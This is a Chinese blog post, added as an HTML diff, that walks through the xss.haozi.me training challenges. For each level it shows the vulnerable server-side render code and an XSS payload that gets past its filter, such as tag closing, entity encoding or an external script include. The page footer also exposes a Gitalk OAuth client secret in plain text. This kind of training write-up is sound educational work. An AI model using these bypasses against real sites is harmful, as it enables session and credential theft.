@@ -1,0 +1,602 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>XSS弹窗练习 : xss.haozi.me | MokYan</title>
+<link rel="shortcut icon" href="https://M0kY4n.github.io111/favicon.ico?v=1625225841143">
+<link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.css" rel="stylesheet">
+<link rel="stylesheet" href="https://M0kY4n.github.io111/styles/main.css">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/go.min.js"></script>
+<script src="https://cdn.bootcss.com/moment.js/2.23.0/moment.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+        crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+        crossorigin="anonymous"></script>
+
+<!-- DEMO JS -->
+<script src="media/scripts/index.js"></script>
+
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            MokYan
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+    </div>
+</nav>
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    XSS弹窗练习 : xss.haozi.me
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2020-07-28 ·
+                    </time>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/ljoh2fRtL/" class="post-tags">
+                            # JavaScript
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/OhHVLfc7Bs/" class="post-tags">
+                            # XSS
+                        </a>
+                    
+                        <a href="https://M0kY4n.github.io111/tag/vRbMnkaqNV/" class="post-tags">
+                            # Web漏洞
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="xss弹窗闯关练习">XSS弹窗闯关练习</h1>
+<br>
+<h2 id="前言">前言</h2>
+<p>这是一个xss弹窗练习平台，让你一个点一个点的理解 XSS。页面上展现了源码，方便直接，更易理解其原理。</p>
+<blockquote>
+<p>平台地址: https://xss.haozi.me/#/</p>
+</blockquote>
+<p>首次进去需要输入一个昵称,且提醒你<code>请在 input code 框内输入代码，以至弹出 alert(1) 为过关</code></p>
+<br>
+<h2 id="0x00">0x00</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;div&gt;' + input + '&lt;/div&gt;'
+}
+
+前端代码:
+&lt;div&gt;&lt;/div&gt;
+</code></pre>
+<p>服务器端没有任何过滤直接执行JavaScript代码即可</p>
+<pre><code class="language-js">payload:
+&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-01.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x01">0x01</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'
+}
+
+前端代码:
+&lt;textarea&gt;&lt;/textarea&gt;
+</code></pre>
+<p>服务器虽然没有进行过滤,但是前端的<code>textarea</code>标签会将JavaScript代码文本化直接输出，所以添加一个结束标签凑成一对就能绕过</p>
+<pre><code class="language-javascript">payload:
+&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-02.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x02">0x02</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;input type=&quot;name&quot; value=&quot;' + input + '&quot;&gt;'
+}
+
+前端代码:
+&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;
+</code></pre>
+<p>服务器依旧没有进行过滤,不过这次代码插入在<code>input</code>标签下的<code>value</code>属性下,依旧会吧JavaScript代码文本化直接输出,因此将<code>value的双引号</code>和<code>input的右尖括号</code>补全 即可绕过</p>
+<pre><code class="language-javascript">payload:
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-03.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x03">0x03</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripBracketsRe = /[()]/g
+  input = input.replace(stripBracketsRe, '')
+  return input
+}
+</code></pre>
+<p>这题服务器终于对JavaScript代码进行过滤了,使用是正则表达式匹配,如果匹配成功就替换成空</p>
+<ul>
+<li>正则表达式<code>/[()]/g</code></li>
+<li>末尾的g是<code>全局匹配</code></li>
+<li>两条斜杠是代表<code>开始与结束的位置</code></li>
+<li>方括号是表示匹配<code>方括号中的任意字符</code></li>
+<li>这个正则表达式的意思就是,全局匹配<code>左括号和有括号</code></li>
+</ul>
+<p>染过方法有很多</p>
+<pre><code class="language-html">payload:
+可用反引号代替括号
+&lt;img src=&quot;&quot; onerror=alert`1`&gt;
+
+可用Html实体编码表示左右括号
+&lt;img src=&quot;&quot; onerror=alert&amp;lpar;1&amp;rpar;&gt;
+&lt;img src=&quot;&quot; onerror=alert&amp;#40;1&amp;#41;&gt;
+&amp;lpar;和&amp;#40;表示左括号(
+&amp;rpar;和&amp;#41;表示右括号)
+
+可以引用外部js文件
+&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-04.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x04">0x04</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripBracketsRe = /[()`]/g
+  input = input.replace(stripBracketsRe, '')
+  return input
+}
+</code></pre>
+<p>这题和0x03很像,就是正则表达式多了个反引号检测,所以0x03的payload除了第一条,其他都能用</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-05.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x05">0x05</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/--&gt;/g, '😂')
+  return '&lt;!-- ' + input + ' --&gt;'
+}
+
+前端代码:
+&lt;!--  --&gt;
+</code></pre>
+<p>服务器使用正则表达式进行了过滤,<code>--&gt;</code>被替换成😂,然而<code>&lt;!--</code>与<code>--&gt;</code>组成一个HTML注释,但是HTML还有一种与能与<code>&lt;!--</code>组成,就是<code>--!&gt;</code>,HTML会自动转为<code>--&gt;</code></p>
+<pre><code class="language-javascript">payload:
+--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-06.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x06">0x06</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/auto|on.*=|&gt;/ig, '_')
+  return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
+}
+
+前端代码:
+&lt;input value=1  type=&quot;text&quot;&gt;
+</code></pre>
+<p>服务器依旧使用正则表达式过滤,把<code>auto</code>、<code>&gt;</code>、<code>on来头=结尾</code>,正则表达式的<code>i</code>是<code>不区分大小写</code>,但是正则表达式没有过滤换行</p>
+<pre><code class="language-javascript">payload:
+onclick
+=alert(1)
+单机文本框即可触发JavaScript代码
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-07.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x07">0x07</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
+
+  input = input.replace(stripTagsRe, '')
+  return `&lt;article&gt;${input}&lt;/article&gt;`
+}
+
+前端代码:
+&lt;article&gt;&lt;/article&gt;
+</code></pre>
+<p>服务器使用正则表达式,对<code>&lt;&gt;</code>括起来的内容进行过滤替换成空,但是由于<code>HTML</code>的容错性极高,所以,对于不闭合也能接受</p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=alert(1)
+     后面加\\ 空格 回车 才能触发
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-08.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x08">0x08</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (src) {
+  src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */')
+  return `
+    &lt;style&gt;
+      ${src}
+    &lt;/style&gt;
+  `
+}
+
+前端代码:
+&lt;style&gt;
+      
+    &lt;/style&gt;
+</code></pre>
+<p>服务器正则表达式过滤了我们想要闭合的<code>style标签</code>,且忽略了大小写,但是正则表达式是以一个整体来判断,所以在style闭合标签里面加入空格,就能绕过</p>
+<pre><code class="language-javascript">payload:
+&lt;/style &gt;
+&lt;script&gt; alert(1) &lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-09.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x09">0x09</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+
+前端代码:
+Invalid URL
+</code></pre>
+<p>服务器使用正则表达式限制了,必须使用<code>https://www.sogmentfault.com</code>开头,且放在<code>script</code>标签的<code>src</code>属性里面.所以我们需要闭合绕过</p>
+<pre><code class="language-javascript">payload:
+https://www.segmentfault.com&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://xss.haozi.me/j.js&quot;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-10.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0a">0x0A</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f')
+  }
+
+  const domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+
+前端代码:
+Invalid URL
+</code></pre>
+<p>和<code>0x09</code>一样需要制定的Url开头,但是本题还将&quot;&amp;、`、&quot;、&lt;、&gt;、&quot;这些标点符号全部转换成HTML实体编码.因此本题不能通过闭合绕过,需要用到HTML的@特性,请求Url: www.google.com@www.youtube.com 最后访问到是 YouTube , Google相当于做了一次跳转</p>
+<pre><code class="language-javascript">payload:
+https://www.segmentfault.com@xss.haozi.me/j.js
+</code></pre>
+<p><code>注意:由于Chrome浏览器的一些安全机制,无法正常请求这个Url,所以这题改为使用Firefox浏览器</code></p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-11.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0b">0x0B</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.toUpperCase()
+  return `&lt;h1&gt;${input}&lt;/h1&gt;`
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>这关使用了<code>toUpperCase</code>函数对输入的字符进行大写转换,HTML标签不区分大小写,但是JavaScript代码区分,也就是说<code>ALERT</code>不能执行.但是可以将JavaScript代码进行<code>uniocde</code>编码进行绕过</p>
+<p><code>注意Unicode编码有两种结果,一个是中文转Unicode结果是\u开头的,另一个是ASCII转Unicode结果是&amp;#开头的.这里用ASCII转Unicode</code></p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-12.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0c">0x0C</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/script/ig, '')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>服务器使用正则表达式将<code>script</code>替换成空,且对输入的字符进行大写转换,使用<code>0x0B</code>的payload即可,不要相信网上用外部引入<code>j.js</code>,因为转为大写不存在这个文件</p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-13.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0d">0x0D</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/[&lt;/&quot;']/g, '')
+  return `
+    &lt;script&gt;
+          // alert('${input}')
+    &lt;/script&gt;
+  `
+}
+
+前端代码:
+&lt;script&gt;
+          // alert('')
+    &lt;/script&gt;
+</code></pre>
+<p>服务器使用正则表达式对 <code>&lt; / &quot; '</code>进行过滤替换成空,且在输入的地方进行单行注释,因为是单行注释所以换行就能绕过,但是由于后面接着<code>')</code>,所以必须屏蔽或闭合才能执行JavaScript代码,根据服务器端代码,只能使用 <code>--&gt;</code>来进行注释</p>
+<pre><code class="language-javascript">payload:(注意有一行空行)
+
+alert(1)
+--&gt;
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-14.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0e巨坑">0x0E(巨坑!!!)</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>服务器使用正则表达式对以<code>&lt;</code>开头后面接大小写字母进行替换成<code>&lt;_</code>加大写字母,导致无法使用<code>script</code>标签,且大写的JavaScript代码无法执行,没有丝毫头绪,翻了下官方WP,了解到一些骚知识</p>
+<p><code>ſ</code>是古英语中的s的写法, 转成大写是正常的<code>S</code></p>
+<p><code>这也太骚了吧!!!,玩CTF吗???脑洞这么大</code></p>
+<p><code>又是一个坑!!!,官方WP是引入j.js 由于大写转换后变成J.JS.文件不存在访问404.只能去自己的服务器写脚本引入自己的js文件</code></p>
+<pre><code class="language-javascript">payload:
+&lt;ſcript src=&quot;http://自己的服务器/ALERT.JS&quot;&gt;&lt;/script&gt;
+
+ALERT.JS:
+alert(1)
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-15.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0f">0x0F</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f;')
+  }
+  return `&lt;img src onerror=&quot;console.error('${escapeHtml(input)}')&quot;&gt;`
+}
+
+前端代码:
+&lt;img src onerror=&quot;console.error('')&quot;&gt;
+</code></pre>
+<p>服务器对<code>&amp; ' &quot; &lt; &gt; \</code>进行HTML实体编码,但是在HTML标签里面使用HTML实体编码没啥用,因为浏览器会解析HTML实体编码,所以将<code>onerror的console.error闭合</code>绕过就行了</p>
+<pre><code class="language-javascript">payload:
+')alert('1
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-16.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x10">0x10</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return `
+&lt;script&gt;
+  window.data = ${input}
+&lt;/script&gt;
+  `
+}
+
+前端代码:
+&lt;script&gt;
+  window.data = 
+&lt;/script&gt;
+</code></pre>
+<p>送分题???没有任何过滤,能直接执行alert(1)</p>
+<pre><code class="language-javascript">payload:
+alert(1)
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-17.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x11">0x11</h2>
+<pre><code class="language-javascript">服务器端代码:
+// from alf.nu
+function render (s) {
+  function escapeJs (s) {
+    return String(s)
+            .replace(/\\/g, '\\\\')
+            .replace(/'/g, '\\\'')
+            .replace(/&quot;/g, '\\&quot;')
+            .replace(/`/g, '\\`')
+            .replace(/&lt;/g, '\\74')
+            .replace(/&gt;/g, '\\76')
+            .replace(/\//g, '\\/')
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r')
+            .replace(/\t/g, '\\t')
+            .replace(/\f/g, '\\f')
+            .replace(/\v/g, '\\v')
+            // .replace(/\b/g, '\\b')
+            .replace(/\0/g, '\\0')
+  }
+  s = escapeJs(s)
+  return `
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;${s}&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+`
+}
+
+前端代码:
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+</code></pre>
+<p>服务器过滤了一大堆字符,并在其前面添加反斜杠进行转义</p>
+<p>注意<code>console.log(&quot;${s}&quot;)</code>,当我们输入一个双引号<code>&quot;</code>,正则会变成<code>\&quot;</code>,然后整条语句变成<code>console.log(&quot;\&quot;&quot;)</code>.这样反斜杠就失去转义的作用</p>
+<pre><code class="language-javascript">payload:
+&quot;);alert(&quot;1
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-18.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x12">0x12</h2>
+<pre><code class="language-javascript">服务器端代码:
+// from alf.nu
+function escape (s) {
+  s = s.replace(/&quot;/g, '\\&quot;')
+  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;'
+}
+
+前端代码:
+&lt;script&gt;console.log(&quot;&quot;);&lt;/script&gt;
+</code></pre>
+<p>服务器对双引号进行过滤,转为<code>\\&quot;</code>,把双引号和括号进行补全就能绕过</p>
+<pre><code class="language-javascript">payload:
+\&quot;);alert(1)//
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-19.png" alt="" loading="lazy"></figure>
+<br>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://M0kY4n.github.io111/post/upload-labs-tong-guan-shou-ce/" class="post-title gt-a-link">
+                    文件上传漏洞总结 : Upload-Labs通关手册
+                </a>
+            </div>
+        
+
+        
+            
+                <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '33314f7248b5c9af3dd7',
+    clientSecret: 'a00f05259046ad817d64c59027a0388812fe40b7',
+    repo: 'MokYan.github.io',
+    owner: 'MokYan',
+    admin: ['MokYan'],
+    id: location.pathname,      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">The more you know, the more you don't know</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+                <a href="https://weibo.com/2125865220/profile?topnav=1&amp;wvr=6" target="_blank">
+                    <i class="fab fa-weibo gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://www.zhihu.com/people/damo-18-66" target="_blank">
+                    <i class="fab fa-zhihu gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+    </div>
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a href="https://M0kY4n.github.io111/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+    hljs.initHighlightingOnLoad()
+</script>
+
+
+    </div>
+</div>
+</body>
+</html>
